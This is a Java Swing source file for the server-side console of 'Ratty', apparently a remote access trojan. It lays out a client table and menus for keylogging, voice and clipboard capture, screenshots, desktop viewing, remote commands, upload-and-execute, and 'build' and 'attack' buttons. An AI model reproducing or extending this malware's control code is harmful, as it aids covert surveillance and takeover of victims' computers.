package de.sogomn.rat.gui.server;

import static de.sogomn.rat.util.Constants.LANGUAGE;
import static de.sogomn.rat.util.Resources.CATEGORY_ICONS;
import static de.sogomn.rat.util.Resources.MENU_ICONS;

import java.awt.BorderLayout;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Insets;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ListSelectionModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.JTableHeader;

import de.sogomn.rat.gui.AbstractSwingGui;
import de.sogomn.rat.util.Constants;
import de.sogomn.rat.util.Resources;

/*
 * CONSTANT OVERLOAD!!! WHEEE!
 */
public final class RattySwingGui extends AbstractSwingGui implements IRattyGui {
	
	private JTable table;
	private ServerClientTableModel tableModel;
	private JScrollPane scrollPane;
	private JPopupMenu menu;
	private JMenuBar menuBar;
	private JButton manageServers, build, attack;
	private ServerClient selectedClient;
	
	private static final String TITLE = "Ratty " + Constants.VERSION;
	private static final Dimension SIZE = new Dimension(1200, 600);
	private static final FlowLayout MENU_BAR_LAYOUT = new FlowLayout(FlowLayout.LEFT, 6, 0);
	private static final Insets MENU_BAR_MARGIN = new Insets(3, 0, 3, 0);
	private static final int ROW_HEIGHT = 25;
	private static final int TABLE_HEADER_HEIGHT = 30;
	
	private static final BufferedImage SURVEILLANCE_ICON = CATEGORY_ICONS[0];
	private static final BufferedImage FILE_MANAGEMENT_ICON = CATEGORY_ICONS[1];
	private static final BufferedImage UTILITY_ICON = CATEGORY_ICONS[2];
	private static final BufferedImage OTHER_ICON = CATEGORY_ICONS[3];
	
	private static final String SURVEILLANCE = LANGUAGE.getString("menu.surveillance");
	private static final String FILE_MANAGEMENT = LANGUAGE.getString("menu.file_management");
	private static final String UTILITY = LANGUAGE.getString("menu.utility");
	private static final String OTHER = LANGUAGE.getString("menu.other");
	private static final LinkedHashMap<String, BufferedImage> FILE_MANAGEMENT_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
	private static final LinkedHashMap<String, BufferedImage> SURVEILLANCE_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
	private static final LinkedHashMap<String, BufferedImage> UTILITY_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
	private static final LinkedHashMap<String, BufferedImage> OTHER_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
	
	public static final String POPUP = LANGUAGE.getString("action.popup");
	public static final String SCREENSHOT = LANGUAGE.getString("action.screenshot");
	public static final String DESKTOP = LANGUAGE.getString("action.desktop");
	public static final String VOICE = LANGUAGE.getString("action.voice");
	public static final String FILES = LANGUAGE.getString("action.files");
	public static final String COMMAND = LANGUAGE.getString("action.command");
	public static final String CLIPBOARD = LANGUAGE.getString("action.clipboard");
	public static final String WEBSITE = LANGUAGE.getString("action.website");
	public static final String AUDIO = LANGUAGE.getString("action.audio");
	public static final String UPLOAD_EXECUTE = LANGUAGE.getString("action.upload_execute");
	public static final String FREE = LANGUAGE.getString("action.free");
	public static final String BUILD = LANGUAGE.getString("action.build");
	public static final String ATTACK = LANGUAGE.getString("action.attack");
	public static final String DROP_EXECUTE = LANGUAGE.getString("action.drop_execute");
	public static final String CHAT = LANGUAGE.getString("action.chat");
	public static final String INFORMATION = LANGUAGE.getString("action.information");
	public static final String UNINSTALL = LANGUAGE.getString("action.uninstall");
	public static final String KEYLOG = LANGUAGE.getString("action.keylog");
	public static final String SHUT_DOWN = LANGUAGE.getString("action.shut_down");
	public static final String RESTART = LANGUAGE.getString("action.restart");
	public static final String MANAGE_SERVERS = LANGUAGE.getString("action.manage_servers");
	public static final String CLOSE = "Close";
	
	static {
		SURVEILLANCE_ITEM_DATA.put(SCREENSHOT, MENU_ICONS[1]);
		SURVEILLANCE_ITEM_DATA.put(DESKTOP, MENU_ICONS[2]);
		SURVEILLANCE_ITEM_DATA.put(VOICE, MENU_ICONS[3]);
		SURVEILLANCE_ITEM_DATA.put(CLIPBOARD, MENU_ICONS[6]);
		SURVEILLANCE_ITEM_DATA.put(KEYLOG, MENU_ICONS[15]);
		FILE_MANAGEMENT_ITEM_DATA.put(FILES, MENU_ICONS[4]);
		FILE_MANAGEMENT_ITEM_DATA.put(UPLOAD_EXECUTE, MENU_ICONS[9]);
		FILE_MANAGEMENT_ITEM_DATA.put(DROP_EXECUTE, MENU_ICONS[11]);
		UTILITY_ITEM_DATA.put(POPUP, MENU_ICONS[0]);
		UTILITY_ITEM_DATA.put(COMMAND, MENU_ICONS[5]);
		UTILITY_ITEM_DATA.put(WEBSITE, MENU_ICONS[8]);
		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
		UTILITY_ITEM_DATA.put(CHAT, MENU_ICONS[12]);
		OTHER_ITEM_DATA.put(RESTART, MENU_ICONS[17]);
		OTHER_ITEM_DATA.put(SHUT_DOWN, MENU_ICONS[16]);
		OTHER_ITEM_DATA.put(INFORMATION, MENU_ICONS[13]);
		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[10]);
		OTHER_ITEM_DATA.put(UNINSTALL, MENU_ICONS[14]);
	}
	
	public RattySwingGui() {
		table = new JTable();
		tableModel = new ServerClientTableModel();
		scrollPane = new JScrollPane(table, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
		menu = new JPopupMenu();
		menuBar = new JMenuBar();
		manageServers = new JButton(MANAGE_SERVERS);
		build = new JButton(BUILD);
		attack = new JButton(ATTACK);
		
		final Container contentPane = frame.getContentPane();
		final JMenu surveillance = createMenu(SURVEILLANCE, SURVEILLANCE_ICON, SURVEILLANCE_ITEM_DATA);
		final JMenu fileManagement = createMenu(FILE_MANAGEMENT, FILE_MANAGEMENT_ICON, FILE_MANAGEMENT_ITEM_DATA);
		final JMenu utility = createMenu(UTILITY, UTILITY_ICON, UTILITY_ITEM_DATA);
		final JMenu other = createMenu(OTHER, OTHER_ICON, OTHER_ITEM_DATA);
		final JTableHeader tableHeader = table.getTableHeader();
		final WindowAdapter closingAdapter = new WindowAdapter() {
			@Override
			public void windowClosing(final WindowEvent w) {
				notifyListeners(controller -> controller.userInput(CLOSE, this));
			}
		};
		final MouseAdapter rightClickAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final Point point = m.getPoint();
				final int row = table.rowAtPoint(point);
				
				selectedClient = tableModel.getServerClient(row);
				table.setRowSelectionInterval(row, row);
			}
		};
		final DefaultTableCellRenderer cellRenderer = (DefaultTableCellRenderer)tableHeader.getDefaultRenderer();
		final int tableHeaderWidth = tableHeader.getWidth();
		final Dimension tableHeaderSize = new Dimension(tableHeaderWidth, TABLE_HEADER_HEIGHT);
		
		tableHeader.setReorderingAllowed(false);
		tableHeader.setPreferredSize(tableHeaderSize);
		cellRenderer.setHorizontalAlignment(DefaultTableCellRenderer.CENTER);
		
		manageServers.setActionCommand(MANAGE_SERVERS);
		manageServers.addActionListener(this::actionPerformed);
		attack.setActionCommand(ATTACK);
		attack.addActionListener(this::actionPerformed);
		build.setActionCommand(BUILD);
		build.addActionListener(this::actionPerformed);
		menuBar.setLayout(MENU_BAR_LAYOUT);
		menuBar.setMargin(MENU_BAR_MARGIN);
		menuBar.add(manageServers);
		menuBar.add(build);
		menuBar.add(attack);
		menu.add(surveillance);
		menu.add(fileManagement);
		menu.add(utility);
		menu.addSeparator();
		menu.add(other);
		scrollPane.setBorder(null);
		table.setComponentPopupMenu(menu);
		table.setModel(tableModel);
		table.setRowHeight(ROW_HEIGHT);
		table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		table.setShowGrid(true);
		table.addMouseListener(rightClickAdapter);
		
		contentPane.add(scrollPane, BorderLayout.CENTER);
		contentPane.add(menuBar, BorderLayout.SOUTH);
		
		frame.setTitle(TITLE);
		frame.setIconImages(Resources.GUI_ICONS);
		frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		frame.addWindowListener(closingAdapter);
		frame.setPreferredSize(SIZE);
		frame.pack();
		frame.setLocationRelativeTo(null);
	}
	
	private JMenu createMenu(final String name, final BufferedImage image, final Map<String, BufferedImage> data) {
		final JMenu menu = new JMenu(name);
		final ImageIcon icon = new ImageIcon(image);
		final Set<String> keySet = data.keySet();
		
		menu.setIcon(icon);
		
		for (final String key : keySet) {
			final BufferedImage itemImage = data.get(key);
			final JMenuItem item = createMenuItem(key, itemImage);
			
			menu.add(item);
		}
		
		return menu;
	}
	
	private JMenuItem createMenuItem(final String name, final BufferedImage image) {
		final JMenuItem item = new JMenuItem(name);
		final ImageIcon icon = new ImageIcon(image);
		
		item.setActionCommand(name);
		item.addActionListener(this::actionPerformed);
		item.setIcon(icon);
		
		return item;
	}
	
	private void actionPerformed(final ActionEvent a) {
		final String command = a.getActionCommand();
		
		notifyListeners(controller -> controller.userInput(command, this));
	}
	
	@Override
	public void update() {
		final int selectedRow = table.getSelectedRow();
		
		tableModel.fireTableDataChanged();
		
		if (selectedRow != -1) {
			table.setRowSelectionInterval(selectedRow, selectedRow);
		}
	}
	
	@Override
	public void addClient(final ServerClient client) {
		tableModel.addServerClient(client);
	}
	
	@Override
	public void removeClient(final ServerClient client) {
		tableModel.removeServerClient(client);
	}
	
	@Override
	public ServerClient getSelectedClient() {
		return selectedClient;
	}
	
}